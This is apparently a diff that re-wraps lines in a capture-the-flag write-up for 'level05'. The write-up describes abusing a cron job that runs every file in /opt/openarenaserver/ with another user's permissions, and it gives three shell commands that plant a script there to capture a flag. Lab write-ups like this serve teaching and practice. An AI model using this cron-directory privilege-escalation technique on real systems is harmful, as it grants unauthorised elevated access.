@@ -1,9 +1,11 @@
 By looking around, we found a file : /rofs/var/mail/level05. 
 
-This file is a cronjob that executes the /usr/sbin/openarenaserver file every 2 minutes with flag05's permissions.
+This file is a cronjob that executes the /usr/sbin/openarenaserver file every 
+2 minutes with flag05's permissions.
 This file executes every file located in the /opt/openarenaserver/ directory.
 
-The idea is to create a script in the /opt/openarenaserver/ directory that will execute the getflag command.
+The idea is to create a script in the /opt/openarenaserver/ directory that will 
+execute the getflag command.
 	echo 'getflag > /tmp/flag_output.txt' > /opt/openarenaserver/getflag.sh
 	chmod +x /opt/openarenaserver/getflag.sh
 	cat /tmp/flag_output.txt
